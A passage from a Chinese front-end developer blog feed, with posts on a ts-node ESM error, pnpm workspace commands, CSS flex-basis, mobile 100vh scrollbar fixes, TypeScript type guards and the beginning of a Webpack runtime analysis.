        <content type="html"><![CDATA[<p>表现：使用 ts-node 执行 esm 规范的模块时报错：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TypeError [ERR_UNKNOWN_FILE_EXTENSION]: Unknown file extension <span class="string">&quot;.ts&quot;</span> <span class="keyword">for</span> /../../xxx.ts</span><br></pre></td></tr></table></figure><p>修改 <code>tsconfig.json</code> 后仍然无法正常运行。</p><p>解决方案：</p><ul><li>切换 Node 版本；</li><li>tsconfig 配置 targte 目标为 commonjs，并删除 <code>package.json</code>  中的 <code>type: module</code>；</li></ul><p>关联 Github issue <a href="https://github.com/TypeStrong/ts-node/issues/2100">https://github.com/TypeStrong/ts-node/issues/2100</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Typescript </tag>
            
            <tag> NodeJS </tag>
            
            <tag> ts-node </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pnpm 的 workspace 管理</title>
      <link href="/2024/06/fc0844d1e4fd.html"/>
      <url>/2024/06/fc0844d1e4fd.html</url>
      
        <content type="html"><![CDATA[<p>吐槽：pnpm 文档真的是一个大版本一个不一样，workspace 的管理指令都变了好几次了，每次都要重新查找，因此在这里写一个备忘，防止 pnpm 挖坑。</p><h1 id="如何添加-workspace"><a href="#如何添加-workspace" class="headerlink" title="如何添加 workspace"></a>如何添加 workspace</h1><p>在根目录创建 <code>pnpm-workspace.yaml</code>。</p><p><a href="https://pnpm.io/workspaces">官方文档</a></p><h1 id="如何指定在某个工作区执行-install、run-等指令"><a href="#如何指定在某个工作区执行-install、run-等指令" class="headerlink" title="如何指定在某个工作区执行 install、run 等指令"></a>如何指定在某个工作区执行 install、run 等指令</h1><p>pnpm@9：使用 <code>--filter</code>，如：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pnpm --filter workspace_name run dev</span><br><span class="line">pnpm --filter ./path/to/package run dev <span class="comment"># 一定要带 `./` 使用相对路径</span></span><br></pre></td></tr></table></figure><p>此外还可以使用 <code>-C</code> 来选中 workspace（这个方式是旧版本的 pnpm 使用的，目前已经不在官方文档中了）：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pnpm -C path/to/workspace <span class="comment"># md，这里又可以不用 `./` 写相对路径</span></span><br></pre></td></tr></table></figure><p>亦或者直接从 packages 目录下执行：</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./path/to/package pnpm run dev</span><br></pre></td></tr></table></figure><h1 id="pnpm-link"><a href="#pnpm-link" class="headerlink" title="pnpm link"></a>pnpm link</h1><p><code>pnpm link --global</code> 会将当前的包软链接到全局的 pnpm 存储目录下（pnpm 的全局存储目录可以通过 <code>pnpm store path</code> 获取），用于在本地开发一个包时进行调试。</p><p>在目标项目中，使用 <code>pnpm link --global &lt;package name&gt;</code> 来安装刚才链接到全局的包，但是注意该包并不会在 package.json 中体现，只能在 node_modules 目录下看到该软链。</p><p>如果向在目标项目中移除通过 <code>link</code> 安装的包，则使用 <code>pnpm unlink</code>，pnpm 会删除当前项目使用 <code>link</code> 创建的软链。</p><p>如果想要移除本地包在 pnpm 全局存储目录下的链接，可以使用 <code>pnpm uninstall &lt;package name&gt; --global</code> 来删除。</p><blockquote><p>注意，如果项目使用了 webpack 进行构建，<a href="https://webpack.js.org/configuration/resolve/#resolve-symlinks"><code>resolve.syslinks</code></a>  会导致软链按照真实路径进行包查找，导致依赖包无法被正常索引到，但是关了 syslinks 又会导致 pnpm 的软链逻辑时效，啥也不是。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 前端工程化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> npm </tag>
            
            <tag> pnpm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>flex  属性值及其具体表现</title>
      <link href="/2024/06/6321181112c9.html"/>
      <url>/2024/06/6321181112c9.html</url>
      
        <content type="html"><![CDATA[<h1 id="1-flex-basis"><a href="#1-flex-basis" class="headerlink" title="1. flex-basis"></a>1. flex-basis</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-basis">MDN</a></p><p><code>flex-basis</code> 指定了 flex 元素在主轴方向上的初始大小，如在 <code>flex-direction: row</code> 上描述的是其宽度，在 <code>flex-direction: column</code> 上描述的是其高度。</p><p>语法：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 指定&lt;&#x27;width&#x27;&gt; */</span></span><br><span class="line"><span class="attribute">flex-basis</span>: <span class="number">10em</span>;</span><br><span class="line"><span class="attribute">flex-basis</span>: <span class="number">3px</span>;</span><br><span class="line"><span class="attribute">flex-basis</span>: auto;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 固有的尺寸关键词 */</span></span><br><span class="line"><span class="attribute">flex-basis</span>: fill;</span><br><span class="line"><span class="attribute">flex-basis</span>: max-content;</span><br><span class="line"><span class="attribute">flex-basis</span>: min-content;</span><br><span class="line"><span class="attribute">flex-basis</span>: fit-content;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 在 flex item 内容上的自动尺寸 */</span></span><br><span class="line"><span class="attribute">flex-basis</span>: content;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 全局数值 */</span></span><br><span class="line"><span class="attribute">flex-basis</span>: inherit;</span><br><span class="line"><span class="attribute">flex-basis</span>: initial;</span><br><span class="line"><span class="attribute">flex-basis</span>: unset;</span><br></pre></td></tr></table></figure><h3 id="宽度表现"><a href="#宽度表现" class="headerlink" title="宽度表现"></a>宽度表现</h3><p>当 <code>flex-basis</code> 的值大于元素在父级元素中的可占用空间，那么元素会被压缩，只占用可用的剩余空间（容器宽度 300px，<code>flex-basis: 500px</code>，实际占用 170px）：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240613205852.png" alt="image.png|350"></p><p>当元素内容宽度超出 <code>flex-basis</code> 设定的值时，元素宽度会无视设定值并拉伸元素，同时也会无视父级容器元素的宽度，超出父级容器限制：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240613210220.png" alt="image.png|350"></p><p>元素的实际宽度值计算：最大最小尺寸限制(min-width/max-width) &gt; 弹性增长或收缩(flex-grow/flex-shrink) &gt; 基础尺寸(flex-basis/width)</p><h3 id="与-width-height-的区别"><a href="#与-width-height-的区别" class="headerlink" title="与 width height 的区别"></a>与 width height 的区别</h3><p><strong>谁主沉浮？</strong></p><p>在 flex 布局中，元素的宽高与 <code>width</code> <code>height</code> 并无直接的关系，而是有 <code>flex-basis</code> 来决定的，当同时使用 <code>width</code> 和 <code>flex-basis</code> 时，前者不生效：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line"><span class="attribute">flex-basis</span>: <span class="number">200px</span>;</span><br><span class="line"><span class="attribute">width</span>: <span class="number">1000px</span>; // 不生效</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之所以我们平常使用 <code>width</code> <code>height</code> 来设定 flex 元素可以生效，那是因为 <code>flex-basis</code> 元素的默认值为 <code>auto</code>，在此时元素的空间计算取决于以下几点：</p><ul><li><code>box-sizing</code>盒模型；</li><li><code>width</code>/<code>min-width</code>/<code>max-width</code>等CSS属性设置；</li><li><code>content</code>内容（min-content最小宽度）；</li></ul><p><strong>在什么情况下 width 和 flex-basis 的表现不一样？</strong></p><p>当元素的内容宽度超过 <code>width</code> 和 <code>flex-basis</code> 的设定值时，两者的表现不一致。如果我们设定了绝对宽度，当元素内容超出宽度时内容会溢出，而当使用 <code>flex-basis</code> 时元素内容会将元素本身撑开。</p><p>比如，在下面的例子中，容器宽度为 200px，蓝色元素的内容宽度很显然已经超过 100px：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240613220913.png" alt="image.png|350"></p><p>当我们在蓝色元素上添加 <code>width: 100px</code> 时，其表现为：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240613220955.png" alt="image.png|350"></p><p>当我们在蓝色元素上添加 <code>flex-basis: 100px</code> 时，其表现为：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240613221034.png" alt="image.png|350"></p><p>但是在这种情况下，<code>flex-basis</code> 与 <code>width</code> 的优先级发生了变化，当同时设定两者时表现与只设定 <code>width</code> 一致（Firefox 向 Safari、Chrome 对其）。</p><h3 id="flex-basis-的关键字属性值"><a href="#flex-basis-的关键字属性值" class="headerlink" title="flex-basis 的关键字属性值"></a>flex-basis 的关键字属性值</h3><p>不常用，简单看一下表现。</p><p><code>min-content</code> 表现：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240613222107.png" alt="image.png|350"></p><p><code>max-content</code> 表现：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240613222129.png" alt="image.png|350"></p><h1 id="2-flex-grow"><a href="#2-flex-grow" class="headerlink" title="2. flex-grow"></a>2. flex-grow</h1><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/flex-grow">MDN</a></p><p>用于设置 flex 项 <a href="https://www.w3.org/TR/css-flexbox/#main-size">主尺寸</a> 的 flex 增长系数。</p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> CSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> flex </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>在移动端中使用 100vh 导致页面出现滚动条的解决方法</title>
      <link href="/2024/05/147bfac7f85e.html"/>
      <url>/2024/05/147bfac7f85e.html</url>
      
        <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>现在有如下的 HTML 结构：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span>Header<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>Footer<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果我们想给页面一个最小高度，保证 Header 和 Footer 分别位于页面的顶部和底部，我们通常会这样写样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">* &#123;</span><br><span class="line"><span class="attribute">padding</span>: <span class="number">0</span>;</span><br><span class="line"><span class="attribute">margin</span>: <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">min-height</span>: <span class="number">100vh</span>;</span><br><span class="line"><span class="comment">/* flex 布局 */</span></span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">flex-direction</span>: column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: skyblue;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在浏览器中我们预览的效果如下：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240527210517.png" alt="image.png|350"></p><p>但是如果在移动端使用某些浏览器，比如 iOS 的 Safari，就会出现纵向滚动条： </p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240527210914.png" alt="20240527210914.png|753"></p><p>这是因为某些移动端浏览器在计算 vh 时，会将工具栏高度也计算进去，因此会出现滚动条，我们可以通过如下三种方案去尝试修复这个行为。</p><h1 id="方案一：使用-webkit-fill-available"><a href="#方案一：使用-webkit-fill-available" class="headerlink" title="方案一：使用 -webkit-fill-available"></a>方案一：使用 <code>-webkit-fill-available</code></h1><p><code>-webkit-fill-available</code> 是 webkit 浏览器独有的一个属性值，表示填充剩余可用空间，因此我们可以将 <code>body</code> 的 <code>min-height</code> 设置为该值，就可让 body 填充整个视口了：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="comment">/* 不支持 -webkit-fill-available 的回落到 100vh */</span></span><br><span class="line"><span class="attribute">min-height</span>: <span class="number">100vh</span>;</span><br><span class="line"><span class="attribute">min-height</span>: -webkit-fill-available;</span><br><span class="line"><span class="comment">/* flex 布局 */</span></span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">flex-direction</span>: column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: skyblue;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置后我们发现 safari 的高度正常了，但是 PC 和 Android 的 Chrome 浏览器高度却不对了：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240527213658.png" alt="image.png|350"></p><p>这是由于 <code>-webkit-fill-available</code> 两者的表现形式不统一造成的：</p><ul><li>在 Safari 中：如果设定了 <code>height: -webkit-fill-available</code> 元素父级元素设定了绝对的宽高，那么其元素高度就是父级元素的高度。如果父级元素没有宽高，那其高度就是视口的宽度，可用于替代 <code>100vh</code> 让移动端不出现滚动条；</li><li>在 Chrome 中：只有 html 元素设置了 <code>height: -webkit-fill-available</code> 才会填充整个视口宽度，如果想让子元素的高度也为视口高，那就需要层层设置 <code>height: -webkit-fill-available</code>。</li></ul><p>因此如果想要兼容 Chrome 的表现，就需要将 CSS 修改为：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line"><span class="attribute">height</span>: -webkit-fill-available;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="comment">/* 不支持 -webkit-fill-available 的回落到 100vh */</span></span><br><span class="line"><span class="attribute">min-height</span>: <span class="number">100vh</span>;</span><br><span class="line"><span class="attribute">min-height</span>: -webkit-fill-available;</span><br><span class="line"><span class="comment">/* flex 布局 */</span></span><br><span class="line"><span class="attribute">display</span>: flex;</span><br><span class="line"><span class="attribute">flex-direction</span>: column;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.content</span> &#123;</span><br><span class="line"><span class="attribute">background-color</span>: skyblue;</span><br><span class="line"><span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>注意：html 必须设置 height 而不能设置 min-height，这是因为 body 要继承 html 的高度，如果不指明，子元素的 <code>min-height: -webkit-fill-available</code> 就相当于 <code>min-height: auto</code>。</p></blockquote><p>该方法较为简单，CSS 兼容性也尚可，但是如果元素嵌套过深，比如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;header&quot;</span>&gt;</span>Header<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;content&quot;</span>&gt;</span>Content<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;footer&quot;</span>&gt;</span>Footer<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们想为 <code>.container</code> 设置 <code>min-height</code> 为 <code>-webkit-fill-available</code>，那就必须将 <code>body</code>、<code>html</code> 的 <code>height</code> 设置为 <code>-webkit-fill-available</code>，这样 <code>.cotainer</code> 的最小高度才能在 Chrome 中生效。</p><p>参考：<a href="https://allthingssmitty.com/2020/05/11/css-fix-for-100vh-in-mobile-webkit/">《CSS fix for 100vh in mobile WebKit》</a></p><h1 id="方案二：使用-window-innerHeight"><a href="#方案二：使用-window-innerHeight" class="headerlink" title="方案二：使用 window.innerHeight"></a>方案二：使用 <code>window.innerHeight</code></h1><p><code>window.innerHeight</code> 可以用于获取视口高度，在移动端浏览器中，该值不会包含工具栏的高度，因此我们可以通过该值来修正 <code>vh</code>。</p><p>我们可以使用 CSS Var 来创建一个全局变量 <code>--vh</code>，该变量的值为 <code>window.innerHeight * 0.01</code>，也就是 <code>1vh</code> 的高度，然后将使用 <code>100vh</code> 的地方替换为 <code>calc(var(--vh, 1vh) * 100)</code> 即可。</p><p>代码逻辑如下：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">setVhCssVar</span>(<span class="params"></span>) &#123;</span><br><span class="line"><span class="keyword">const</span> vh = <span class="variable language_">window</span>.<span class="property">innerHeight</span> * <span class="number">0.01</span>;</span><br><span class="line"><span class="comment">// 创建全局变量 --vh</span></span><br><span class="line"><span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">style</span>.<span class="title function_">setProperty</span>(<span class="string">&#x27;--vh&#x27;</span>, <span class="string">`<span class="subst">$&#123;vh&#125;</span>px`</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">setVhCssVar</span>();</span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(<span class="string">&#x27;resize&#x27;</span>, setVhCssVar);</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">min-height</span>: <span class="built_in">calc</span>(<span class="built_in">var</span>(--vh, <span class="number">1vh</span>) * <span class="number">100</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个方案虽然需要使用 Javascript，但是效果是比较好的，可以完美的替换 <code>100vh</code>，且不存在浏览器的差异性。</p><h1 id="方案三：使用-dvh"><a href="#方案三：使用-dvh" class="headerlink" title="方案三：使用 dvh"></a>方案三：使用 <code>dvh</code></h1><p><code>dvh</code> 表示动态视口，是一个比较新的 CSS 单位。其可以动态的表示移动端浏览器的视口高度，比如当浏览器存在工具栏、地址栏时，其表示中间的小视口的高度；而当用户向下滑动，或者手动隐藏掉工具栏时，其表示的是隐藏掉栏框后的大视口高度：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240527215819.png" alt="image.png|350"></p><p>因此我们只需要将 <code>vh</code> 替换为 <code>dvh</code> 即可完美解决滚动条问题：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> &#123;</span><br><span class="line"><span class="attribute">min-height</span>: <span class="number">100</span>dvh;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是该特性由于较新，考虑兼容性问题的话需要慎重使用：</p><p><img src="https://esunr-image-bed.oss-cn-beijing.aliyuncs.com/picgo/20240527215949.png" alt="image.png|350"></p><p>参考：<a href="https://www.cnblogs.com/coco1s/p/17078218.html">《vh 存在问题？试试动态视口单位之 dvh、svh、lvh》</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CSS </tag>
            
            <tag> 浏览器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typescript Trick</title>
      <link href="/2024/05/2b5552813942.html"/>
      <url>/2024/05/2b5552813942.html</url>
      
        <content type="html"><![CDATA[<h1 id="自定义类型保护函数"><a href="#自定义类型保护函数" class="headerlink" title="自定义类型保护函数"></a>自定义类型保护函数</h1><p>当一个类型是联合类型时，对其进行类型判断将变得困难，如：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">interface</span> <span class="title class_">Foo</span> &#123;</span><br><span class="line">    <span class="attr">foo</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">common</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Bar</span> &#123;</span><br><span class="line">    <span class="attr">bar</span>: <span class="built_in">number</span>;</span><br><span class="line">    <span class="attr">common</span>: <span class="built_in">string</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> <span class="title class_">SomeType</span> = <span class="title class_">Foo</span> | <span class="title class_">Bar</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params">arg: SomeType</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (arg.<span class="property">foo</span>) &#123; <span class="comment">// 类型“Foo | Bar”上不存在属性“foo”。</span></span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">foo</span>); <span class="comment">// 类型“Foo | Bar”上不存在属性“foo”。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">bar</span>); <span class="comment">// 类型“Foo | Bar”上不存在属性“bar”。</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>因此我们可以使用自定义类型保护函数，利用一个函数进行运行时检查，并告知 TS 该类型是一个确定的类型：</p><figure class="highlight ts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isFoo</span>(<span class="params">arg: SomeType</span>): arg is <span class="title class_">Foo</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (arg <span class="keyword">as</span> <span class="title class_">Foo</span>).<span class="property">foo</span> !== <span class="literal">undefined</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">doSomething</span>(<span class="params">arg: SomeType</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_">isFoo</span>(arg)) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">foo</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(arg.<span class="property">bar</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> Javascript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> #Typescript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>从 Webpack 产出分析 Webpack 如何处理 ESM 以及 CJS 模块引用</title>
      <link href="/2024/05/2b7464e001b5.html"/>
      <url>/2024/05/2b7464e001b5.html</url>
      
        <content type="html"><![CDATA[<h1 id="获取未经压缩的-Webpack-打包产出"><a href="#获取未经压缩的-Webpack-打包产出" class="headerlink" title="获取未经压缩的 Webpack 打包产出"></a>获取未经压缩的 Webpack 打包产出</h1><p>为了获取 webpack 的原始产出，我们要对 webpack 配置进行如下操作：</p><ol><li>移除 babel-loader；</li><li><code>optimization.minimize</code> 设置为 false 以关闭 teser 对代码的压缩；</li><li><code>optimization.concatenateModules</code> 设置为 false，避免 ESM 模块被提升到主 IIFE 中，不便于我们观察；</li></ol><h1 id="Webpack-Runtime"><a href="#Webpack-Runtime" class="headerlink" title="Webpack Runtime"></a>Webpack Runtime</h1><p>在查看 webpack 导出内容前，我们需要先了解一下 webpack 的运行时方法、属性。</p><h2 id="webpack-require-g"><a href="#webpack-require-g" class="headerlink" title="__webpack_require__.g"></a><code>__webpack_require__.g</code></h2><p>表示全局对象，这段代码的作用是确保在各种不同的 JavaScript 运行环境中，能够准确地获取到全局对象，从而保证模块化代码在不同环境中的兼容性：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">!(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  __webpack_require__.<span class="property">g</span> = (<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> globalThis === <span class="string">&#x27;object&#x27;</span>) <span class="keyword">return</span> globalThis;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="variable language_">this</span> || <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;return this&#x27;</span>)();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="variable language_">window</span> === <span class="string">&#x27;object&#x27;</span>) <span class="keyword">return</span> <span class="variable language_">window</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)();</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="webpack-require-p"><a href="#webpack-require-p" class="headerlink" title="__webpack_require__.p"></a><code>__webpack_require__.p</code></h2><p>表示脚本的公共路径，如果在 webpack 构建文件中设置了 <code>output.publicPath</code>，则会被赋值为设置的路径：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* webpack/runtime/publicPath */</span></span><br><span class="line">!(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  